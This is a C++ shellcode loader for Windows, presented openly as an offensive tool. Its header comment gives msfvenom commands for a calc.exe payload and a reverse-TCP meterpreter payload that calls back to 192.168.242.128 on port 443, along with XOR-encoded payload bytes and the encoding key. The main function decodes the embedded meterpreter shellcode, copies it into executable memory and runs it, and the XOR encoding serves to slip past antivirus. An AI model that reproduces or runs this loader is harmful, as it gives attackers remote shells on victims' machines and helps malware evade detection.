#include <windows.h>
#include <iostream>


//////////////////////////////////////////////////////////////////////////////////
//							Preparation before compiling & runnning this file
///////////////////////////////////////////////////////////////////////////////////
/*
Generate a calc.exe and reverse TCP meterpreter using msfvenom
	msfvenom -p windows/x64/exec CMD="calc.exe" -f raw -o calc_payload.bin
 		\xb1\x31\xd3\x96\x99\x9e\xa1\x74\x65\x63\x2d\x34\x0c\x29\x02\x23\x3f\x3e\x50\xa6\x00\x2b\xe7\x37\x2d\x31\xdb\x20\x71\x3e\xea\x26\x45\x2b\xe7\x17\x1d\x31\x5f\xc5\x23\x3c\x2c\x45\xac\x2b\x5d\xa5\xe1\x45\x31\x0e\x6b\x5a\x41\x35\xa4\xaa\x61\x24\x4c\xb8\xb2\x9f\x3b\x37\x30\x3c\xee\x31\x4c\xee\x0f\x45\x18\x73\xb9\xfd\xe1\xfc\x65\x63\x6c\x2d\xc8\xb9\x24\x15\x21\x77\xb1\x24\xee\x2b\x74\x21\xc6\x39\x70\x3b\x68\xa6\x82\x22\x2d\x9c\xa5\x24\xc6\x4d\xd8\x3a\x68\xa0\x2c\x45\xac\x2b\x5d\xa5\xe1\x38\x91\xbb\x64\x37\x60\xb5\x5d\x83\x19\x94\x01\x7a\x1c\x56\x61\x33\x58\xa5\x10\xbb\x34\x21\xc6\x39\x74\x3b\x68\xa6\x07\x35\xee\x6f\x24\x21\xc6\x39\x4c\x3b\x68\xa6\x20\xff\x61\xeb\x24\x64\x9d\x38\x08\x33\x31\x28\x38\x2e\x24\x3b\x2d\x3c\x0c\x23\x18\xf1\x85\x56\x20\x26\x9a\x83\x34\x24\x14\x23\x18\xf9\x7b\x9f\x36\x8b\x9a\x9c\x31\x2d\xf7\x78\x50\x72\x69\x76\x61\x74\x65\x2b\xe1\xe8\x4c\x78\x50\x72\x28\xcc\x50\xff\x0a\xe4\x93\xb0\xf6\x89\xe5\xd0\x3f\x37\xdb\xd2\xf0\xde\xf1\x9a\x98\x31\xd3\xb6\x41\x4a\x67\x08\x6f\xe3\x97\x85\x38\x7c\xeb\x35\x7a\x04\x0e\x1e\x65\x3a\x2d\xec\x97\x86\x85\x11\x08\x1a\x02\x5a\x00\x1b\x09\x65
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.242.128 LPORT=443 EXITFUNC=thread --platform windows -f raw -o reverse64-192168242128-443.bin 
		\xb1\x31\xd3\x96\x99\x9e\xad\x74\x65\x63\x2d\x34\x0c\x29\x02\x3a\x58\xa4\x04\x3c\xee\x31\x0c\x2d\xc6\x2b\x48\x23\x21\xfd\x33\x54\x33\x2b\x63\xd2\x07\x33\x18\xf9\x1b\x26\x2c\x45\xac\x2b\x5d\xa5\xe1\x45\x31\x0e\x6b\x5a\x41\x35\xa4\xaa\x61\x24\x4c\xb8\xb2\x9f\x3b\x3e\xea\x26\x45\x22\x3d\xee\x0f\x45\x18\x73\xb9\x10\xe0\x0c\x7d\x68\x6e\x6a\xc8\x0b\x50\x72\x69\xfd\xe1\xfc\x65\x63\x6c\x2d\xc8\xb9\x24\x15\x21\x77\xb1\xff\x2d\x7b\x3c\x21\xc6\x39\x70\x3b\x68\xa6\x82\x22\x2d\x9c\xa5\x24\xc6\x4d\xd8\x3f\x58\xbf\x29\x75\xb3\x2b\x5d\xa5\xe1\x38\x91\xbb\x64\x37\x60\xb5\x5d\x83\x19\x94\x01\x7a\x1c\x56\x61\x33\x58\xa5\x10\xbb\x34\x21\xc6\x39\x74\x3b\x68\xa6\x07\x35\xee\x6f\x24\x21\xc6\x39\x4c\x3b\x68\xa6\x20\xff\x61\xeb\x24\x64\x9d\x38\x08\x33\x31\x28\x38\x2e\x24\x3b\x2d\x3c\x0c\x23\x18\xf1\x85\x56\x20\x26\x9a\x83\x34\x24\x14\x23\x18\xf9\x7b\x9f\x2a\x8b\x9a\x9c\x31\x2c\xf3\x0e\x23\x40\x36\x45\x53\x74\x65\x22\x3a\x2c\xc4\x9f\x18\xf3\x85\xd6\x60\x74\x65\x2a\xe5\x80\x04\xc5\x52\x72\x68\xcd\xa1\xdc\x97\xe3\x2d\x31\x04\xf0\xb4\x3e\xe0\x87\x20\xce\x29\x14\x4a\x62\xb2\xac\x1c\xfb\x83\x1e\x60\x75\x65\x63\x35\x24\xf7\x50\xd0\x19\x69\x89\xb4\x1e\x6f\x22\x32\x35\x1d\x34\x61\xbb\x24\x47\xa1\x3c\x9a\xa3\x24\xec\x8f\x31\xaf\xb2\x21\xff\xa0\x35\xdf\x89\x63\xba\xad\x86\x85\x3a\xe0\xb1\x0b\x64\x24\x3b\x20\xec\xaf\x31\xd9\x8b\x28\xcc\xf8\xd1\x11\x02\x93\xb0\xc8\xb9\x24\x78\x20\x89\xaf\x01\x80\x8b\xff\x65\x4d\x79\x18\xf1\x85\x66\x29\xfd\x87\x2e\x5d\xac\x27\x7d\x11\x2a\x21\xff\x98\x35\xdf\x61\xb5\xad\x12\x86\x85\xf1\x91\x76\x1f\x21\x2d\xe0\xa8\x45\x13\xf0\xa6\x18\x29\x37\x38\x1c\x65\x73\x6c\x65\x0c\x21\x18\xfb\x9b\x3e\x50\xbd\x24\xd9\x34\xc1\x1e\x9c\xaf\xa7\x21\xff\xa2\x3d\xec\xa4\x21\x54\x84\x30\xd9\x82\x21\xff\xbb\x3c\xec\x9a\x2d\xdf\x4f\xa0\x98\x2d\x96\xa3\xe2\x8c\x65\x1e\x44\x3d\x0c\x2e\x09\x1a\x69\x36\x61\x74\x24\x3b\x06\x65\x17\x38\xea\x79\x46\x79\x51\x8b\xb0\x34\x35\x24\xf7\x0c\x3e\x3f\x08\x89\xb4\x3d\x9a\xad\x85\x59\xb2\x86\xaf\x3a\x68\xb5\x29\x5d\xa3\x2b\xe9\x93\x38\xcd\x11\x8d\x8e\x2e\x0b\x74\x3c\xd8\x8c\x78\x67\x73\x11\xfb\xb3\x89\xb4
XOR encode the .bin payload using key MyPrivatecle (it shows both encoded and non-encoded binary in a hex format)
	python3 myEncoder3.py calc_payload.bin MyPrivatecle 
	Copy the XORed shellcode in the code below
Compile the C++ code (cmd.exe)
	g++ -o YourExecutable.exe -O2 -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -std=c++11 YourFile.cpp

*/


//////////////////////////////////////////////////////////////////////////////////
//							GOOOO
//////////////////////////////////////////////////////////////////////////////////

int main(int argc, char **argv) {

	/////////////////////////////// Shellcode data //////////////////////////////
	// Fill in according to what was done in Preparation above
	char encryptedShellcode[] = "\xb1\x31\xd3\x96\x99\x9e\xad\x74\x65\x63\x2d\x34\x0c\x29\x02\x3a\x58\xa4\x04\x3c\xee\x31\x0c\x2d\xc6\x2b\x48\x23\x21\xfd\x33\x54\x33\x2b\x63\xd2\x07\x33\x18\xf9\x1b\x26\x2c\x45\xac\x2b\x5d\xa5\xe1\x45\x31\x0e\x6b\x5a\x41\x35\xa4\xaa\x61\x24\x4c\xb8\xb2\x9f\x3b\x3e\xea\x26\x45\x22\x3d\xee\x0f\x45\x18\x73\xb9\x10\xe0\x0c\x7d\x68\x6e\x6a\xc8\x0b\x50\x72\x69\xfd\xe1\xfc\x65\x63\x6c\x2d\xc8\xb9\x24\x15\x21\x77\xb1\xff\x2d\x7b\x3c\x21\xc6\x39\x70\x3b\x68\xa6\x82\x22\x2d\x9c\xa5\x24\xc6\x4d\xd8\x3f\x58\xbf\x29\x75\xb3\x2b\x5d\xa5\xe1\x38\x91\xbb\x64\x37\x60\xb5\x5d\x83\x19\x94\x01\x7a\x1c\x56\x61\x33\x58\xa5\x10\xbb\x34\x21\xc6\x39\x74\x3b\x68\xa6\x07\x35\xee\x6f\x24\x21\xc6\x39\x4c\x3b\x68\xa6\x20\xff\x61\xeb\x24\x64\x9d\x38\x08\x33\x31\x28\x38\x2e\x24\x3b\x2d\x3c\x0c\x23\x18\xf1\x85\x56\x20\x26\x9a\x83\x34\x24\x14\x23\x18\xf9\x7b\x9f\x2a\x8b\x9a\x9c\x31\x2c\xf3\x0e\x23\x40\x36\x45\x53\x74\x65\x22\x3a\x2c\xc4\x9f\x18\xf3\x85\xd6\x60\x74\x65\x2a\xe5\x80\x04\xc5\x52\x72\x68\xcd\xa1\xdc\x97\xe3\x2d\x31\x04\xf0\xb4\x3e\xe0\x87\x20\xce\x29\x14\x4a\x62\xb2\xac\x1c\xfb\x83\x1e\x60\x75\x65\x63\x35\x24\xf7\x50\xd0\x19\x69\x89\xb4\x1e\x6f\x22\x32\x35\x1d\x34\x61\xbb\x24\x47\xa1\x3c\x9a\xa3\x24\xec\x8f\x31\xaf\xb2\x21\xff\xa0\x35\xdf\x89\x63\xba\xad\x86\x85\x3a\xe0\xb1\x0b\x64\x24\x3b\x20\xec\xaf\x31\xd9\x8b\x28\xcc\xf8\xd1\x11\x02\x93\xb0\xc8\xb9\x24\x78\x20\x89\xaf\x01\x80\x8b\xff\x65\x4d\x79\x18\xf1\x85\x66\x29\xfd\x87\x2e\x5d\xac\x27\x7d\x11\x2a\x21\xff\x98\x35\xdf\x61\xb5\xad\x12\x86\x85\xf1\x91\x76\x1f\x21\x2d\xe0\xa8\x45\x13\xf0\xa6\x18\x29\x37\x38\x1c\x65\x73\x6c\x65\x0c\x21\x18\xfb\x9b\x3e\x50\xbd\x24\xd9\x34\xc1\x1e\x9c\xaf\xa7\x21\xff\xa2\x3d\xec\xa4\x21\x54\x84\x30\xd9\x82\x21\xff\xbb\x3c\xec\x9a\x2d\xdf\x4f\xa0\x98\x2d\x96\xa3\xe2\x8c\x65\x1e\x44\x3d\x0c\x2e\x09\x1a\x69\x36\x61\x74\x24\x3b\x06\x65\x17\x38\xea\x79\x46\x79\x51\x8b\xb0\x34\x35\x24\xf7\x0c\x3e\x3f\x08\x89\xb4\x3d\x9a\xad\x85\x59\xb2\x86\xaf\x3a\x68\xb5\x29\x5d\xa3\x2b\xe9\x93\x38\xcd\x11\x8d\x8e\x2e\x0b\x74\x3c\xd8\x8c\x78\x67\x73\x11\xfb\xb3\x89\xb4";
	char key[] = "MyPrivatecle";
	char cipherType[] = "xor";

	// Char array to host the deciphered shellcode
	char shellcode[sizeof encryptedShellcode];	
	

	/////////////////////////////// XOR decoding ////////////////////////////// 
	int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;
		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
	}

	///////////////////////// Allocate, Write, Execute ////////////////////////
	// Allocating memory with EXECUTE writes
	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copying deciphered shellcode into memory as a function
	memcpy(exec, shellcode, sizeof shellcode);

	// Call the shellcode
	((void(*)())exec)();
}
